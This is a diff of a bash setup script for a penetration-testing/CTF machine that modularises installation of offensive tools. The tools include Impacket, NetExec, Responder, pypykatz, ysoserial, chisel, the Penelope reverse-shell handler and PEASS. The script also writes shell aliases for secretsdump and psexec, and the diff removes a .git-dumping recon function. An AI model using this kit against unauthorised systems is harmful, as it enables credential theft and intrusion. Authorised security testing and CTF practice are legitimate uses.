+  log_progress "Installing zsh plugins..."
+  sudo -u "$USERNAME" git clone https://github.com/zsh-users/zsh-autosuggestions ${USER_HOME}/.oh-my-zsh/custom/plugins/zsh-autosuggestions 2>/dev/null || true
+  sudo -u "$USERNAME" git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${USER_HOME}/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting 2>/dev/null || true
+  
   # Install Powerlevel10k theme
   log_progress "Installing Powerlevel10k theme..."
-  sudo -u jamie git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${USER_HOME}/.oh-my-zsh/custom/themes/powerlevel10k 2>/dev/null || true
- 
-  # Download pre-configured p10k config from GitHub
-  log_info "Downloading pre-configured Powerlevel10k config"
-  sudo -u jamie wget https://raw.githubusercontent.com/Jamie-loring/Public-scripts/main/p10k-jamie-config.zsh -O ${USER_HOME}/.p10k.zsh 2>/dev/null || log_warn "Failed to download p10k config, will use default"
- 
-  # Set Zsh as default shell for jamie
-  chsh -s $(which zsh) jamie || true
- 
-  # Configure LightDM to auto-login as jamie
-  log_info "Configuring auto-login for jamie"
-  if [ -f /etc/lightdm/lightdm.conf ]; then
-    # Backup original config
-    cp /etc/lightdm/lightdm.conf /etc/lightdm/lightdm.conf.backup 2>/dev/null || true
-   
-    # Remove any existing autologin-user lines and add jamie
-    sed -i '/^autologin-user=/d' /etc/lightdm/lightdm.conf
-    sed -i '/^\[Seat:\*\]/a autologin-user=jamie' /etc/lightdm/lightdm.conf
-  fi
- 
-  log_info "Phase 3 complete"
-  log_progress "Phase 3/8:  Complete"
+  sudo -u "$USERNAME" git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${USER_HOME}/.oh-my-zsh/custom/themes/powerlevel10k 2>/dev/null || true
+  
+  # Download pre-configured p10k config
+  log_info "Downloading pre-configured Powerlevel10k config..."
+  sudo -u "$USERNAME" wget -q https://raw.githubusercontent.com/Jamie-loring/Public-scripts/main/p10k-jamie-config.zsh -O ${USER_HOME}/.p10k.zsh 2>/dev/null || log_warn "Failed to download p10k config"
+  
+  # Set Zsh as default shell
+  chsh -s $(which zsh) "$USERNAME" 2>/dev/null || true
+  
+  # Configure .zshrc (will be created in phase8 with dotfiles)
+  
+  log_info "✓ Shell environment setup complete"
 }
 
 # ============================================
-# PHASE 4: Tool Installation & Optimization
+# PHASE 4: TOOLS INSTALLATION (MODULAR)
 # ============================================
 phase4_tools_setup() {
-  show_progress 4
-  log_progress "Phase 4/8: Tool Installation (repos, wordlists, scripts)..."
-  log_info "Phase 4: Installing and configuring pentesting tools"
- 
-  # Create tool directory structure as jamie
-  sudo -u jamie mkdir -p $USER_HOME/tools/{wordlists,scripts,exploits,repos}
- 
-  # Impacket - properly installed
+  log_progress "Phase: Tool Installation"
+  
+  # Create tool directory structure
+  log_progress "Creating tool directory structure..."
+  sudo -u "$USERNAME" mkdir -p $USER_HOME/tools/{wordlists,scripts,exploits,repos}
+  
+  # Core tools (always if any tool category is selected)
+  if [ "$CORE_TOOLS" = "true" ]; then
+    install_core_tools
+  fi
+  
+  # Web enumeration tools
+  if [ "$WEB_ENUMERATION" = "true" ]; then
+    install_web_tools
+  fi
+  
+  # Windows/AD tools
+  if [ "$WINDOWS_AD" = "true" ]; then
+    install_windows_tools
+  fi
+  
+  # Wireless tools
+  if [ "$WIRELESS" = "true" ]; then
+    install_wireless_tools
+  fi
+  
+  # Post-exploitation tools
+  if [ "$POSTEXPLOIT" = "true" ]; then
+    install_postexploit_tools
+  fi
+  
+  # Forensics & Stego tools
+  if [ "$FORENSICS_STEGO" = "true" ]; then
+    install_forensics_tools
+  fi
+  
+  # Binary exploitation tools
+  if [ "$BINARY_EXPLOITATION" = "true" ]; then
+    install_binary_tools
+  fi
+  
+  log_info "✓ Tool installation complete"
+}
+
+# Core tools module
+install_core_tools() {
+  log_progress "Installing core tools (Python, Go, Ruby base)..."
+  
+  # Impacket
   log_progress "Installing Impacket..."
-  pip3 install impacket --break-system-packages || pip3 install impacket
- 
-  # Install pipx for isolated Python tool installations
-  log_progress "Installing pipx for isolated Python environments..."
-  DEBIAN_FRONTEND=noninteractive apt install -y pipx
-  pipx ensurepath
- 
-  # Modern Python pentesting tools with pipx
-  log_progress "Installing NetExec (modern CrackMapExec replacement)..."
-  sudo -u jamie pipx install git+https://github.com/Pennyw0rth/NetExec || log_warn "NetExec failed to install"
- 
-  # Core HTB/CTF tools (APT)
-  log_progress "Installing core CTF/HTB utilities, pivoting, and power user replacements..."
-  DEBIAN_FRONTEND=noninteractive apt install -y \
-    socat rlwrap xfreerdp upx proxychains4 \
-    zoxide eza btop httpie yq \
-    aircrack-ng bluez bluelog hcitool wpscan \
-    steghide zsteg binwalk foremost exiftool p7zip-full radare2 \
-    sqlmap hashcat john theharvester cewl gdb || true
- 
-  # Other essential Python tools with pip
-  log_progress "Installing essential Python pentesting tools, including hash identification..."
+  pip3 install impacket --break-system-packages 2>&1 | tee -a /var/log/ctfbox-install.log || pip3 install impacket 2>&1 | tee -a /var/log/ctfbox-install.log
+  
+  # Install pipx
+  log_progress "Installing pipx..."
+  if ! command -v pipx &> /dev/null; then
+    apt update -qq > /dev/null 2>&1 && apt install -y pipx 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "Failed to install pipx"
+  fi
+  
+  if command -v pipx &> /dev/null; then
+    pipx ensurepath
+    log_progress "Installing NetExec..."
+    sudo -u "$USERNAME" pipx install git+https://github.com/Pennyw0rth/NetExec 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "NetExec failed to install"
+  fi
+  
+  # Essential Python tools
+  log_progress "Installing essential Python tools..."
   pip3 install --break-system-packages \
-    hashid \
-    featherduster \
+    hashid featherduster \
     bloodhound bloodyAD mitm6 responder certipy-ad coercer \
     pypykatz lsassy enum4linux-ng dnsrecon git-dumper \
     roadrecon manspider mitmproxy pwntools \
-    ROPgadget truffleHog || true
- 
-  # RsaCtfTool requires specific Python version - install from repo if needed
+    ROPgadget truffleHog \
+    2>&1 | tee -a /var/log/ctfbox-install.log || true
+  
+  # RsaCtfTool from GitHub
   if [ ! -d "$USER_HOME/tools/repos/RsaCtfTool" ]; then
-    log_progress "Installing RsaCtfTool from GitHub..."
-    sudo -u jamie git clone https://github.com/RsaCtfTool/RsaCtfTool.git $USER_HOME/tools/repos/RsaCtfTool || log_warn "RsaCtfTool clone failed"
+    log_progress "Installing RsaCtfTool..."
+    sudo -u "$USERNAME" git clone https://github.com/RsaCtfTool/RsaCtfTool.git $USER_HOME/tools/repos/RsaCtfTool 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "RsaCtfTool clone failed"
   fi
- 
-  # Java deserialization (ysoserial)
-  log_progress "Installing ysoserial (Java deserialization)..."
+  
+  # ysoserial
+  log_progress "Installing ysoserial..."
   if [ ! -f "$USER_HOME/tools/ysoserial.jar" ]; then
-    DEBIAN_FRONTEND=noninteractive apt install -y default-jre || true
-    sudo -u jamie wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O $USER_HOME/tools/ysoserial.jar 2>/dev/null || log_warn "Failed to download ysoserial"
-   
-    # Create wrapper script
-    if [ -f "$USER_HOME/tools/ysoserial.jar" ]; then
-      cat > /usr/local/bin/ysoserial << 'YSOSERIAL_EOF'
+    if command -v java &> /dev/null; then
+      sudo -u "$USERNAME" wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O $USER_HOME/tools/ysoserial.jar 2>/dev/null || log_warn "Failed to download ysoserial"
+      
+      if [ -f "$USER_HOME/tools/ysoserial.jar" ]; then
+        cat > /usr/local/bin/ysoserial << 'YSOSERIAL_EOF'
 #!/bin/bash
 java -jar ~/tools/ysoserial.jar "$@"
 YSOSERIAL_EOF
-      chmod +x /usr/local/bin/ysoserial
+        chmod +x /usr/local/bin/ysoserial
+      fi
     fi
   fi
- 
-  # one_gadget & haiti (Ruby)
-  log_progress "Installing Ruby utility haiti (Hash ID) and one_gadget..."
-  DEBIAN_FRONTEND=noninteractive apt install -y ruby ruby-dev || true
-  gem install one_gadget haiti-hash || log_warn "Ruby gem installation failed. You may need to run 'gem install one_gadget haiti-hash' as jamie later."
- 
-  # Modern Go-based tools (ProjectDiscovery suite + essentials)
-  log_progress "Installing modern Go-based tools (ProjectDiscovery suite, ffuf, etc.)..."
- 
-  go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest || true
-  go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
-  go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest || true
-  go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
-  go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
-  go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest || true
-  go install -v github.com/ffuf/ffuf@latest || true
-  go install -v github.com/OJ/gobuster/v3@latest || true
-  go install -v github.com/ropnop/kerbrute@latest || true
-  go install -v github.com/jpillora/chisel@latest || true
-  go install -v github.com/zricethezav/gitleaks/v8@latest || true
- 
-  # Fallback pivoting tool
-  log_progress "Installing sshuttle (VPN over SSH)..."
-  DEBIAN_FRONTEND=noninteractive apt install -y sshuttle || true
- 
-  # Clone essential repos
-  log_progress "Cloning essential pentesting repositories..."
- 
-  if [ ! -d "$USER_HOME/tools/repos/PayloadsAllTheThings" ]; then
-    sudo -u jamie git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git $USER_HOME/tools/repos/PayloadsAllTheThings
+  
+  # Ruby gems
+  log_progress "Installing Ruby gems (one_gadget, haiti)..."
+  if command -v gem &> /dev/null; then
+    gem install one_gadget haiti-hash 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "Ruby gem installation failed"
   fi
-  if [ ! -d "$USER_HOME/tools/repos/PEASS-ng" ]; then
-    sudo -u jamie git clone https://github.com/peass-ng/PEASS-ng.git $USER_HOME/tools/repos/PEASS-ng
+}
+
+# Web enumeration tools module
+install_web_tools() {
+  log_progress "Installing web enumeration tools..."
+  
+  if ! command -v go &> /dev/null; then
+    log_warn "Go not found - skipping Go tools"
+    return
   fi
-  if [ ! -d "$USER_HOME/tools/repos/Windows-Exploit-Suggester" ]; then
-    sudo -u jamie git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git $USER_HOME/tools/repos/Windows-Exploit-Suggester
+  
+  log_progress "Installing ProjectDiscovery suite..."
+  sudo -u "$USERNAME" bash -c 'export GOPATH=$HOME/go && \
+    go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest && \
+    go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest && \
+    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && \
+    go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && \
+    go install -v github.com/projectdiscovery/katana/cmd/katana@latest && \
+    go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest' \
+    2>&1 | tee -a /var/log/ctfbox-install.log || true
+  
+  log_progress "Installing other web tools..."
+  sudo -u "$USERNAME" bash -c 'export GOPATH=$HOME/go && \
+    go install -v github.com/ffuf/ffuf@latest && \
+    go install -v github.com/OJ/gobuster/v3@latest' \
+    2>&1 | tee -a /var/log/ctfbox-install.log || true
+}
+
+# Windows/AD tools module
+install_windows_tools() {
+  log_progress "Installing Windows/AD tools..."
+  
+  # Already installed in core: NetExec, Impacket, bloodhound, bloodyAD, certipy-ad, pypykatz, lsassy
+  log_info "Windows/AD tools (NetExec, Impacket, etc.) installed in core tools"
+  
+  # Kerberos tools
+  if command -v go &> /dev/null; then
+    log_progress "Installing kerbrute..."
+    sudo -u "$USERNAME" bash -c 'export GOPATH=$HOME/go && go install -v github.com/ropnop/kerbrute@latest' 2>&1 | tee -a /var/log/ctfbox-install.log || true
   fi
-  if [ ! -d "$USER_HOME/tools/repos/PowerSploit" ]; then
-    sudo -u jamie git clone https://github.com/PowerShellMafia/PowerSploit.git $USER_HOME/tools/repos/PowerSploit
+}
+
+# Wireless tools module
+install_wireless_tools() {
+  log_progress "Installing wireless tools..."
+  
+  DEBIAN_FRONTEND=noninteractive apt install -y \
+    aircrack-ng bluez bluelog hcitool \
+    2>&1 | tee -a /var/log/ctfbox-install.log || true
+}
+
+# Post-exploitation tools module
+install_postexploit_tools() {
+  log_progress "Installing post-exploitation tools..."
+  
+  # Pivoting tools
+  DEBIAN_FRONTEND=noninteractive apt install -y \
+    socat rlwrap proxychains4 sshuttle \
+    2>&1 | tee -a /var/log/ctfbox-install.log || true
+  
+  # Chisel
+  if command -v go &> /dev/null; then
+    log_progress "Installing chisel..."
+    sudo -u "$USERNAME" bash -c 'export GOPATH=$HOME/go && go install -v github.com/jpillora/chisel@latest' 2>&1 | tee -a /var/log/ctfbox-install.log || true
   fi
-  if [ ! -d "$USER_HOME/tools/repos/HackTricks" ]; then
-    sudo -u jamie git clone https://github.com/HackTricks-wiki/HackTricks.git $USER_HOME/tools/repos/HackTricks
-  fi
-  if [ ! -d "$USER_HOME/tools/repos/AutoRecon" ]; then
-    sudo -u jamie git clone https://github.com/Tib3rius/AutoRecon.git $USER_HOME/tools/repos/AutoRecon
-  fi
-  if [ ! -d "$USER_HOME/tools/repos/impacket" ]; then
-    sudo -u jamie git clone https://github.com/fortra/impacket.git $USER_HOME/tools/repos/impacket
-  fi
-  if [ ! -d "$USER_HOME/tools/repos/GTFOBins" ]; then
-    sudo -u jamie git clone https://github.com/GTFOBins/GTFOBins.github.io.git $USER_HOME/tools/repos/GTFOBins
-  fi
-  if [ ! -d "$USER_HOME/tools/repos/LOLBAS" ]; then
-    sudo -u jamie git clone https://github.com/LOLBAS-Project/LOLBAS.git $USER_HOME/tools/repos/LOLBAS
-  fi
-  if [ ! -d "$USER_HOME/tools/repos/nuclei-templates" ]; then
-    sudo -u jamie git clone https://github.com/projectdiscovery/nuclei-templates.git $USER_HOME/tools/repos/nuclei-templates
-  fi
-  if [ ! -d "$USER_HOME/tools/repos/GitTools" ]; then
-    sudo -u jamie git clone https://github.com/internetwache/GitTools.git $USER_HOME/tools/repos/GitTools
-  fi
+  
+  # Penelope
   if [ ! -d "$USER_HOME/tools/repos/penelope" ]; then
-    sudo -u jamie git clone https://github.com/brightio/penelope.git $USER_HOME/tools/repos/penelope
+    log_progress "Installing Penelope reverse shell handler..."
+    sudo -u "$USERNAME" git clone https://github.com/brightio/penelope.git $USER_HOME/tools/repos/penelope 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "Penelope clone failed"
   fi
- 
-  # SecLists wordlists
-  log_progress "Downloading SecLists (this is large, ~700MB)..."
+}
+
+# Forensics & Stego tools module
+install_forensics_tools() {
+  log_progress "Installing forensics & stego tools..."
+  
+  DEBIAN_FRONTEND=noninteractive apt install -y \
+    steghide zsteg binwalk foremost exiftool p7zip-full \
+    2>&1 | tee -a /var/log/ctfbox-install.log || true
+}
+
+# Binary exploitation tools module
+install_binary_tools() {
+  log_progress "Installing binary exploitation tools..."
+  
+  DEBIAN_FRONTEND=noninteractive apt install -y \
+    gdb radare2 \
+    2>&1 | tee -a /var/log/ctfbox-install.log || true
+  
+  # pwntools already installed in core Python tools
+  # one_gadget already installed in core Ruby gems
+}
+
+# ============================================
+# PHASE 5: WORDLISTS
+# ============================================
+phase5_wordlists_setup() {
+  log_progress "Phase: Wordlists"
+  
+  # SecLists
+  log_progress "Downloading SecLists (~700MB, this will take a while)..."
   if [ ! -d "$USER_HOME/tools/wordlists/SecLists" ]; then
-    sudo -u jamie git clone --depth 1 https://github.com/danielmiessler/SecLists.git $USER_HOME/tools/wordlists/SecLists
+    sudo -u "$USERNAME" git clone --depth 1 https://github.com/danielmiessler/SecLists.git $USER_HOME/tools/wordlists/SecLists 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "SecLists clone failed"
   fi
- 
-  # Extract rockyou.txt if compressed
+  
+  # Extract rockyou.txt
   if [ -f "/usr/share/wordlists/rockyou.txt.gz" ] && [ ! -f "/usr/share/wordlists/rockyou.txt" ]; then
     log_progress "Extracting rockyou.txt..."
     gunzip /usr/share/wordlists/rockyou.txt.gz
   fi
- 
-  # Create symlinks for easy access
-  log_progress "Creating convenient symlinks..."
-  sudo -u jamie ln -sf $USER_HOME/tools/wordlists/SecLists $USER_HOME/SecLists 2>/dev/null || true
-  sudo -u jamie ln -sf /usr/share/wordlists/rockyou.txt $USER_HOME/tools/wordlists/rockyou.txt 2>/dev/null || true
-  sudo -u jamie ln -sf $USER_HOME/tools/repos/PEASS-ng/linPEAS/linpeas.sh $USER_HOME/linpeas.sh 2>/dev/null || true
-  sudo -u jamie ln -sf $USER_HOME/tools/repos/PEASS-ng/winPEAS/winPEASx64.exe $USER_HOME/winpeas.exe 2>/dev/null || true
-  sudo -u jamie ln -sf $USER_HOME/tools/repos/penelope/penelope.py $USER_HOME/penelope.py 2>/dev/null || true
- 
-  log_info "Phase 4 complete"
-  log_progress "Phase 4/8:  Complete"
+  
+  # Create symlinks
+  log_progress "Creating wordlist symlinks..."
+  sudo -u "$USERNAME" ln -sf $USER_HOME/tools/wordlists/SecLists $USER_HOME/SecLists 2>/dev/null || true
+  sudo -u "$USERNAME" ln -sf /usr/share/wordlists/rockyou.txt $USER_HOME/tools/wordlists/rockyou.txt 2>/dev/null || true
+  
+  log_info "✓ Wordlists setup complete"
 }
 
 # ============================================
-# PHASE 5: Dotfiles & Shell Configuration
+# PHASE 6: REPOSITORIES
 # ============================================
-phase5_dotfiles_setup() {
-  show_progress 5
-  log_progress "Phase 5/8: Dotfiles & Shell Configuration..."
-  log_info "Phase 5: Configuring shell environment and dotfiles"
- 
-  # Configure .zshrc
-  log_progress "Configuring .zshrc with custom aliases and functions..."
+phase6_repos_setup() {
+  log_progress "Phase: Repositories"
+  
+  clone_repo() {
+    local url=$1
+    local name=$(basename $url .git)
+    if [ ! -d "$USER_HOME/tools/repos/$name" ]; then
+      log_progress "Cloning $name..."
+      sudo -u "$USERNAME" git clone $url $USER_HOME/tools/repos/$name 2>&1 | tee -a /var/log/ctfbox-install.log || log_warn "Failed to clone $name"
+    fi
+  }
+  
+  if [ "$REPOS_ESSENTIAL" = "true" ]; then
+    log_progress "Cloning essential repositories..."
+    clone_repo "https://github.com/swisskyrepo/PayloadsAllTheThings.git"
+    clone_repo "https://github.com/peass-ng/PEASS-ng.git"
+    clone_repo "https://github.com/HackTricks-wiki/HackTricks.git"
+    clone_repo "https://github.com/Tib3rius/AutoRecon.git"
+    clone_repo "https://github.com/fortra/impacket.git"
+    clone_repo "https://github.com/projectdiscovery/nuclei-templates.git"
+    clone_repo "https://github.com/internetwache/GitTools.git"
+    clone_repo "https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git"
+    clone_repo "https://github.com/PowerShellMafia/PowerSploit.git"
+  fi
+  
+  if [ "$REPOS_PRIVILEGE" = "true" ]; then
+    log_progress "Cloning privilege escalation repositories..."
+    clone_repo "https://github.com/GTFOBins/GTFOBins.github.io.git"
+    clone_repo "https://github.com/LOLBAS-Project/LOLBAS.git"
+  fi
+  
+  # Create PEASS symlinks
+  if [ -d "$USER_HOME/tools/repos/PEASS-ng" ]; then
+    sudo -u "$USERNAME" ln -sf $USER_HOME/tools/repos/PEASS-ng/linPEAS/linpeas.sh $USER_HOME/linpeas.sh 2>/dev/null || true
+    sudo -u "$USERNAME" ln -sf $USER_HOME/tools/repos/PEASS-ng/winPEAS/winPEASx64.exe $USER_HOME/winpeas.exe 2>/dev/null || true
+  fi
+  
+  # Create Penelope symlink
+  if [ -d "$USER_HOME/tools/repos/penelope" ]; then
+    sudo -u "$USERNAME" ln -sf $USER_HOME/tools/repos/penelope/penelope.py $USER_HOME/penelope.py 2>/dev/null || true
+  fi
+  
+  log_info "✓ Repositories setup complete"
+}
+
+# ============================================
+# PHASE 7: FIREFOX EXTENSIONS
+# ============================================
+phase7_firefox_extensions() {
+  log_progress "Phase: Firefox Extensions"
+  
+  # Find Firefox profile
+  FIREFOX_PROFILE=$(find $USER_HOME/.mozilla/firefox -maxdepth 1 -type d -name "*.default*" 2>/dev/null | head -n 1)
+  
+  if [ -z "$FIREFOX_PROFILE" ]; then
+    log_warn "Firefox profile not found. Starting Firefox once to create profile..."
+    sudo -u "$USERNAME" timeout 5 firefox --headless 2>/dev/null || true
+    sleep 2
+    FIREFOX_PROFILE=$(find $USER_HOME/.mozilla/firefox -maxdepth 1 -type d -name "*.default*" 2>/dev/null | head -n 1)
+  fi
+  
+  if [ -n "$FIREFOX_PROFILE" ]; then
+    log_info "Firefox profile found: $FIREFOX_PROFILE"
+    sudo -u "$USERNAME" mkdir -p "$FIREFOX_PROFILE/extensions"
+    
+    # Download extensions
+    log_progress "Installing Firefox extensions..."
+    sudo -u "$USERNAME" wget -q "https://addons.mozilla.org/firefox/downloads/latest/foxyproxy-standard/latest.xpi" \
+      -O "$FIREFOX_PROFILE/extensions/foxyproxy@eric.h.jung.xpi" 2>/dev/null || log_warn "Failed to download FoxyProxy"
+    
+    sudo -u "$USERNAME" wget -q "https://addons.mozilla.org/firefox/downloads/latest/darkreader/latest.xpi" \
+      -O "$FIREFOX_PROFILE/extensions/addon@darkreader.org.xpi" 2>/dev/null || log_warn "Failed to download Dark Reader"
+    
+    sudo -u "$USERNAME" wget -q "https://addons.mozilla.org/firefox/downloads/latest/cookie-editor/latest.xpi" \
+      -O "$FIREFOX_PROFILE/extensions/{c5f15d22-8421-4a2f-9bed-e4e2c0b560e0}.xpi" 2>/dev/null || log_warn "Failed to download Cookie-Editor"
+    
+    sudo -u "$USERNAME" wget -q "https://addons.mozilla.org/firefox/downloads/latest/wappalyzer/latest.xpi" \
+      -O "$FIREFOX_PROFILE/extensions/wappalyzer@crunchlabs.com.xpi" 2>/dev/null || log_warn "Failed to download Wappalyzer"
+    
+    log_info "Firefox extensions installed"
+  else
+    log_warn "Could not find or create Firefox profile"
+  fi
+  
+  log_info "✓ Firefox extensions setup complete"
+}
+
+# ============================================
+# PHASE 8: AUTOMATION & DOTFILES
+# ============================================
+phase8_automation_setup() {
+  log_progress "Phase: Automation Scripts & Dotfiles"
+  
+  sudo -u "$USERNAME" mkdir -p $USER_HOME/scripts
+  
+  # Create .zshrc with aliases
+  log_progress "Configuring .zshrc..."
   cat > $USER_HOME/.zshrc << 'ZSH_EOF'
 # Path to oh-my-zsh
 export ZSH="$HOME/.oh-my-zsh"
@@ -346,10 +1117,10 @@ source $ZSH/oh-my-zsh.sh
 # Load p10k configuration
 [[ -f ~/.p10k.zsh ]] && source ~/.p10k.zsh
 
-# Custom PATH - Includes Go and Ruby gem binaries
-export PATH=$PATH:$HOME/go/bin:$HOME/.local/bin:$HOME/.gem/ruby/$(ls $HOME/.gem/ruby/)/bin
+# Custom PATH
+export PATH=$PATH:$HOME/go/bin:$HOME/.local/bin
 
-# Initialize zoxide (smart directory navigation)
+# Initialize zoxide
 eval "$(zoxide init zsh)"
 
 # Environment variables
@@ -358,18 +1129,17 @@ export VISUAL=vim
 export GOPATH=$HOME/go
 
 # Aliases - System
-alias ls='eza -h --icons' # Modern ls
-alias ll='eza -lag --icons' # Modern ls -lah
+alias ls='eza -h --icons'
+alias ll='eza -lag --icons'
 alias la='eza -a --icons'
 alias l='eza -F --icons'
 alias ..='cd ..'
 alias ...='cd ../..'
-alias grep='grep --color=auto'
 alias c='clear'
 alias h='history'
 alias please='sudo'
-alias rl='rlwrap nc' # netcat with history/line-editing
-alias top='btop' # Modern resource monitor
+alias rl='rlwrap nc'
+alias top='btop'
 
 # Aliases - Pentesting
 alias nmap-quick='nmap -sV -sC -O'
@@ -380,32 +1150,26 @@ alias serve80='sudo python3 -m http.server 80'
 alias myip='curl -s ifconfig.me && echo'
 alias ports='netstat -tulanp'
 alias listening='lsof -i -P -n | grep LISTEN'
-alias hash='hashid' # Primary hash identifier
-alias http='httpie' # Modern cURL replacement
-alias shell='python3 ~/penelope.py' # Penelope reverse shell handler (preferred over nc)
+alias hash='hashid'
+alias http='httpie'
+alias shell='python3 ~/penelope.py'
 
 # Aliases - Tool shortcuts
-alias nxc='netexec' # Short form for NetExec
+alias nxc='netexec'
 alias smb='netexec smb'
 alias winrm='netexec winrm'
 alias bloodhound='bloodhound-python'
 alias peas='linpeas.sh'
-alias secrets='gitleaks detect --source' # Quick secret scan
-alias ysoserial='java -jar ~/tools/ysoserial.jar' # Java deserialization
-alias pwn='gdb -q' # Quick GDB with pwndbg
+alias secrets='gitleaks detect --source'
+alias ysoserial='java -jar ~/tools/ysoserial.jar'
 
-# Aliases - Impacket Shortcuts (Installed via pip3 in Phase 4)
-# Allows running tools without the .py extension.
+# Aliases - Impacket Shortcuts
 alias secretsdump='secretsdump.py'
 alias getnpusers='GetNPUsers.py'
 alias getuserspns='GetUserSPNs.py'
 alias psexec='psexec.py'
 alias smbexec='smbexec.py'
 alias wmiexec='wmiexec.py'
-alias dcomexec='dcomexec.py'
-alias ticketer='ticketer.py'
-alias lookupsid='lookupsid.py'
-alias atexec='atexec.py'
 
 # Aliases - Navigation
 alias tools='cd ~/tools'
@@ -413,7 +1177,6 @@ alias repos='cd ~/tools/repos'
 alias wordlists='cd ~/tools/wordlists'
 alias scripts='cd ~/tools/scripts'
 alias engagements='cd ~/engagements'
-alias z='zoxide' # Shorthand for zoxide (smart cd)
 
 # Functions
 newengagement() {
@@ -436,607 +1199,58 @@ quickscan() {
   nmap -sV -sC -O -oA quickscan_$(date +%Y%m%d_%H%M%S) $1
 }
 
-# Enhanced extract function to handle more compression types
 extract() {
   if [ -f $1 ]; then
     case $1 in
-      *.tar.bz2) tar xjf $1    ;;
-      *.tar.gz)  tar xzf $1    ;;
-      *.bz2)   bunzip2 $1    ;;
-      *.rar)   unrar e $1    ;;
-      *.gz)    gunzip $1     ;;
-      *.tar)   tar xf $1     ;;
-      *.tbz2)   tar xjf $1    ;;
-      *.tgz)   tar xzf $1    ;;
-      *.zip)   unzip $1     ;;
-      *.Z)    uncompress $1   ;;
-      *.7z)    7z x $1      ;; # 7zip support
-      *.deb)   dpkg-deb -x $1 $(mktemp -d) ;; # Debian package
-      *.iso)   echo "Use: sudo mount -o loop $1 /mnt" ;; # ISO advice
-      *)     echo "'$1' cannot be extracted via extract()" ;;
+      *.tar.bz2) tar xjf $1 ;;
+      *.tar.gz)  tar xzf $1 ;;
+      *.bz2)     bunzip2 $1 ;;
+      *.rar)     unrar e $1 ;;
+      *.gz)      gunzip $1 ;;
+      *.tar)     tar xf $1 ;;
+      *.tbz2)    tar xjf $1 ;;
+      *.tgz)     tar xzf $1 ;;
+      *.zip)     unzip $1 ;;
+      *.Z)       uncompress $1 ;;
+      *.7z)      7z x $1 ;;
+      *)         echo "'$1' cannot be extracted via extract()" ;;
     esac
   else
     echo "'$1' is not a valid file"
   fi
 }
-
-# reconchain: Quick recon workflow with ProjectDiscovery tools
-reconchain() {
-  if [ -z "$1" ]; then
-    echo "Usage: reconchain <domain>"
-    return 1
-  fi
-  echo "[+] Starting reconnaissance chain for: $1"
-  echo "[*] Subfinder  DNSx  HTTPx  Nuclei"
-  subfinder -d $1 -silent | dnsx -a -silent | httpx -tech-detect -silent | nuclei -severity critical,high
-}
-
-# gitanalyze: Complete Git repository disclosure workflow
-gitanalyze() {
-  if [ -z "$1" ]; then
-    echo "Usage: gitanalyze <git-url>"
-    echo "Example: gitanalyze http://target.com/.git/"
-    return 1
-  fi
- 
-  local url="$1"
-  local output_dir="git-dump-$(date +%Y%m%d_%H%M%S)"
- 
-  echo "[+] Git Repository Analysis Workflow"
-  echo "[*] Target: $url"
-  echo ""
- 
-  # Step 1: Dump the repository
-  echo "[1/4] Dumping .git repository..."
-  git-dumper "$url" "$output_dir" || {
-    echo "[-] git-dumper failed, trying GitTools..."
-    bash ~/tools/repos/GitTools/Dumper/gitdumper.sh "$url" "$output_dir"
-  }
- 
-  # Step 2: Extract all commits
-  echo "[2/4] Extracting commits..."
-  bash ~/tools/repos/GitTools/Extractor/extractor.sh "$output_dir" "${output_dir}-extracted"
- 
-  # Step 3: Scan for secrets with gitleaks
-  echo "[3/4] Scanning for secrets with gitleaks..."
-  gitleaks detect --source "$output_dir" --report-path "${output_dir}-gitleaks.json" --report-format json || true
- 
-  # Step 4: Scan with truffleHog
-  echo "[4/4] Scanning with truffleHog..."
-  trufflehog filesystem "$output_dir" --json > "${output_dir}-trufflehog.json" || true
- 
-  echo ""
-  echo "[+] Analysis complete!"
-  echo "  Repository: $output_dir"
-  echo "  Extracted commits: ${output_dir}-extracted"
-  echo "  Gitleaks report: ${output_dir}-gitleaks.json"
-  echo "  TruffleHog report: ${output_dir}-trufflehog.json"
-  echo ""
-  echo "[!] Don't forget to check:"
-  echo "  - docker-compose.yml"
-  echo "  - .env files"
-  echo "  - config/ directories"
-  echo "  - Database connection strings"
-}
 ZSH_EOF
-
-  # Configure tmux
-  log_progress "Configuring tmux..."
-  cat > $USER_HOME/.tmux.conf << 'TMUX_EOF'
-# Set prefix to Ctrl-a
-unbind C-b
-set-option -g prefix C-a
-bind-key C-a send-prefix
-
-# Split panes using | and -
-bind | split-window -h
-bind - split-window -v
-unbind '"'
-unbind %
-
-# Switch panes using Alt-arrow without prefix
-bind -n M-Left select-pane -L
-bind -n M-Right select-pane -R
-bind -n M-Up select-pane -U
-bind -n M-Down select-pane -D
-
-# Enable mouse mode
-set -g mouse on
-
-# Start windows and panes at 1, not 0
-set -g base-index 1
-setw -g pane-base-index 1
-
-# Status bar
-set -g status-style 'bg=colour235 fg=colour137 dim'
-set -g status-left ''
-set -g status-right '#[fg=colour233,bg=colour241,bold] %d/%m #[fg=colour233,bg=colour245,bold] %H:%M:%S '
-set -g status-right-length 50
-# ... rest of tmux config
-TMUX_EOF
-
-  # Configure vim
-  log_progress "Configuring vim..."
